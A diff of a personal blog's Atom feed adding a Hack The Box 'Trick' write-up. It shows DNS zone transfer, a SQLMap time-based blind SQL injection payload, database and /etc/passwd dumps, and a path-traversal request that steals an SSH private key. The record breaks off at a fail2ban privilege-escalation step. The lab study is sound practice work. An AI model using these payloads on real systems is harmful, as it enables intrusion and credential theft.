@@ -1,4 +1,657 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2021-06-27T11:47:22-07:00</updated><id>/feed.xml</id><title type="html">Alex Loney</title><subtitle>Computer programming, cyber security, and baking! This blog has it all!</subtitle><author><name>Alex Loney</name></author><entry><title type="html">HTB: Tenet Writeup</title><link href="/blog/writeup/htb/htb-tenet/" rel="alternate" type="text/html" title="HTB: Tenet Writeup" /><published>2021-06-12T12:00:00-07:00</published><updated>2021-06-12T12:00:00-07:00</updated><id>/blog/writeup/htb/htb-tenet</id><content type="html" xml:base="/blog/writeup/htb/htb-tenet/">&lt;p&gt;There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2022-06-24T11:28:26-07:00</updated><id>/feed.xml</id><title type="html">Alex Loney</title><subtitle>Computer programming, cyber security, and baking! This blog has it all!</subtitle><author><name>Alex Loney</name></author><entry><title type="html">HTB: Trick Writeup</title><link href="/blog/writeup/htb/htb-trick/" rel="alternate" type="text/html" title="HTB: Trick Writeup" /><published>2022-06-24T10:41:00-07:00</published><updated>2022-06-24T10:41:00-07:00</updated><id>/blog/writeup/htb/htb-trick</id><content type="html" xml:base="/blog/writeup/htb/htb-trick/">&lt;p&gt;There are spoilers below for the Hack The Box box named Trick. Stop reading here if you do not want spoilers!!!&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;This box was listed as “easy” however I had more trouble with it than other easy boxes I’ve done.&lt;/p&gt;
+
+&lt;h1 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h1&gt;
+&lt;p&gt;I began as always with an nmap port scan&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap trick.htb                         
+Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-06-24 13:42 EDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;trick.htb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.11.166&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.089s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 996 closed tcp ports &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;conn-refused&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+PORT   STATE SERVICE
+22/tcp open  ssh
+25/tcp open  smtp
+53/tcp open  domain
+80/tcp open  http
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1.52 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;port-25&quot;&gt;Port 25&lt;/h2&gt;
+&lt;p&gt;This revealed a few open ports, checking the SMTP port, I was able to verify a couple of users:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Hydra v9.3 (c) 2022 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-20 00:24:50
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 17 login tries (l:17/p:1), ~2 tries per task
+[DATA] attacking smtp-enum://10.129.114.201:25/vrfy
+[25][smtp-enum] host: 10.129.114.201   login: root
+[25][smtp-enum] host: 10.129.114.201   login: mysql
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-20 00:25:21
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;port-53&quot;&gt;Port 53&lt;/h2&gt;
+&lt;p&gt;Checking the DNS port, I was able to determine the hostname of the machine&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 53 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; 10.10.11.166 @10.10.11.166
+
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; DiG 9.18.1-1-Debian &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 53 &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; 10.129.114.201 @10.129.114.201
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; global options: +cmd
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; Got answer:
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;opcode&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;: QUERY, status: NOERROR, id: 58590
+;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
+;; WARNING: recursion requested but not available
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+; COOKIE: 363a80786340ed523b136e9b62aff689e85ea08e14d7c124 (good)
+;; QUESTION SECTION:
+;201.114.129.10.in-addr.arpa.   IN      PTR
+
+;; ANSWER SECTION:
+201.114.129.10.in-addr.arpa. 604800 IN  PTR     trick.htb.
+
+;; AUTHORITY SECTION:
+114.129.10.in-addr.arpa. 604800 IN      NS      trick.htb.
+
+;; ADDITIONAL SECTION:
+trick.htb.              604800  IN      A       127.0.0.1
+trick.htb.              604800  IN      AAAA    ::1
+
+;; Query time: 91 msec
+;; SERVER: 10.129.114.201#53(10.129.114.201) (UDP)
+;; WHEN: Mon Jun 20 00:24:43 EDT 2022
+;; MSG SIZE  rcvd: 165
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From there I was able to perform a zone transfer and obtain additional domains&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;dig axfr @10.129.114.201 trick.htb
+
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; DiG 9.18.1-1-Debian &amp;lt;&amp;lt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; axfr @10.129.114.201 trick.htb
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 server found&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; global options: +cmd
+trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+trick.htb.              604800  IN      NS      trick.htb.
+trick.htb.              604800  IN      A       127.0.0.1
+trick.htb.              604800  IN      AAAA    ::1
+preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
+trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; Query &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 83 msec
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; SERVER: 10.129.114.201#53&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.114.201&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; WHEN: Mon Jun 20 15:28:46 EDT 2022
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; XFR size: 6 records &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;messages 1, bytes 231&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So we now have the following possible domains:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;trick.htb
+root.trick.htb
+preprod-payroll.trick.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;port-80&quot;&gt;Port 80&lt;/h2&gt;
+&lt;p&gt;Visiting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;trick.htb&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root.trick.htb&lt;/code&gt; didn’t yield anything interesting, just a barebones basic website. Running a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; scan on it also revealed nothing of note. The third subdomain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;preprod-payroll.trick.htb&lt;/code&gt; did have something interesting in it, there’s a payroll system. Inserting a single quote into it I was able to determine that it contained a SQL injection vulnerability. Using SQLMap, I was able to discover the login username/password:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; get.txt
+...
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+Parameter: username &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;POST&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    Type: time-based blind
+    Title: MySQL &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; 5.0.12 AND time-based blind &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;query SLEEP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+    Payload: &lt;span class=&quot;nv&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root&lt;span class=&quot;s1&quot;&gt;&apos; AND (SELECT 8596 FROM (SELECT(SLEEP(5)))WGGL) AND &apos;&lt;/span&gt;IitU&lt;span class=&quot;s1&quot;&gt;&apos;=&apos;&lt;/span&gt;IitU&amp;amp;password&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root
+&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;01:01:06] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;INFO] the back-end DBMS is MySQL
+...
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; get.txt &lt;span class=&quot;nt&quot;&gt;--dbs&lt;/span&gt;
+...
+available databases &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;2]:
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; information_schema
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; payroll_db
+...
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; get.txt &lt;span class=&quot;nt&quot;&gt;--database&lt;/span&gt; payroll_db &lt;span class=&quot;nt&quot;&gt;--dump&lt;/span&gt;
+...
+Database: payroll_db
+Table: &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 entry]
++----+-----------+---------------+------+---------+---------+-----------------------+------------+
+| &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; | doctor_id | name          | &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; | address | contact | password              | username   |
++----+-----------+---------------+------+---------+---------+-----------------------+------------+
+| 1  | 0         | Administrator | 1    | &amp;lt;blank&amp;gt; | &amp;lt;blank&amp;gt; | SuperGucciRainbowCake | Enemigosss |
++----+-----------+---------------+------+---------+---------+-----------------------+------------+
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is where I remained stuck for a while, as the login credentials provided did not appear to provide any additional leads once logged in. Eventually, I discovered that there was another subdomain:&lt;/p&gt;
+
+&lt;p&gt;This is where I first got stuck for a while, eventually I found that there are MORE subdomains on the website.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;s/\(.*\)/preprod-\1/g&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; list.txt
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gobuster dns &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; list.txt &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; trick.htb    
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Gobuster v3.1.0
+by OJ Reeves &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@TheColonial&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;amp; Christian Mehlmauer &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;@firefart&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Domain:     trick.htb
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Threads:    10
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:    1s
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:   list.txt
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2022/06/24 13:51:50 Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;DNS enumeration mode
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Found: preprod-marketing.trick.htb
+Found: preprod-payroll.trick.htb  
+                                   
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+2022/06/24 13:53:05 Finished
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;When investigating this additional subdomain, I discovered that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt; accepts a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file=&lt;/code&gt; parameter which reads a given file, but at first I was unable to manipulate it to read any arbitrary file. I remained stuck here for a while, looking for additional subdomains, files, parameters, etc.&lt;/p&gt;
+
+&lt;p&gt;Eventually, I discovered that SQLMap has a way to read a local system file. Additionally, after a lot of time, I discovered that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/www/market/index.php&lt;/code&gt; is the index.php file referenced above:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; get.txt &lt;span class=&quot;nt&quot;&gt;--file-read&lt;/span&gt; /var/www/market/index.php
+...
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php             
+&amp;lt;?php
+&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;page&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;isset&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;index.php&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+   include&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/var/www/market/home.html&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        include&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/var/www/market/&quot;&lt;/span&gt;.str_replace&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;../&quot;&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;,&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Additionally, I can see that there are multiple users on the system&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; get.txt &lt;span class=&quot;nt&quot;&gt;--file-read&lt;/span&gt; /etc/passwd
+...
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /home/kali/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+&lt;span class=&quot;nb&quot;&gt;sync&lt;/span&gt;:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;admin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false
+dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+saned:x:112:121::/var/lib/saned:/usr/sbin/nologin
+colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin
+hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:118:65534::/run/sshd:/usr/sbin/nologin
+postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin
+&lt;span class=&quot;nb&quot;&gt;bind&lt;/span&gt;:x:120:128::/var/cache/bind:/usr/sbin/nologin
+michael:x:1001:1001::/home/michael:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;user&quot;&gt;User&lt;/h1&gt;
+&lt;p&gt;From here, I’m able to exploit the PHP page &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;index.php&lt;/code&gt; to bypass the restriction and access the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;michael&lt;/code&gt; RSA key then SSH into the machine with it:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;--output&lt;/span&gt; michael.id_rsa &lt;span class=&quot;s1&quot;&gt;&apos;http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa&apos;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 michael.id_rsa
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; michael.id_rsa michael@trick.htb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;root&quot;&gt;Root&lt;/h1&gt;
+&lt;p&gt;Obtaining root was a bit tricky, the first thing to notice is that you have access to run a program &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; as root:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;michael on trick:
+    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin
+
+User michael may run the following commands on trick:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /etc/init.d/fail2ban restart
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From here, it requires investigating what this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fail2ban&lt;/code&gt; program is. It turns out that it’s a program used to ban IP addresses due to too many failed attempts. It runs out of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/fail2ban&lt;/code&gt;. Looking at the directory it runs out of, I noticed something odd:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-larth&lt;/span&gt; /etc/fail2ban/
+total 76K
+drwxr-xr-x 126 root root      12K Jun 24 18:40 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root      738 Jun 24 20:09 paths-opensuse.conf
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root      573 Jun 24 20:09 paths-debian.conf
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root     2.8K Jun 24 20:09 paths-common.conf
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root      645 Jun 24 20:09 paths-arch.conf
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root      23K Jun 24 20:09 jail.conf
+drwxr-xr-x   2 root root     4.0K Jun 24 20:09 fail2ban.d
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;   1 root root     2.3K Jun 24 20:09 fail2ban.conf
+drwxrwx---   2 root security 4.0K Jun 24 20:09 action.d
+drwxr-xr-x   2 root root     4.0K Jun 24 20:09 jail.d
+drwxr-xr-x   3 root root     4.0K Jun 24 20:09 filter.d
+drwxr-xr-x   6 root root     4.0K Jun 24 20:09 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
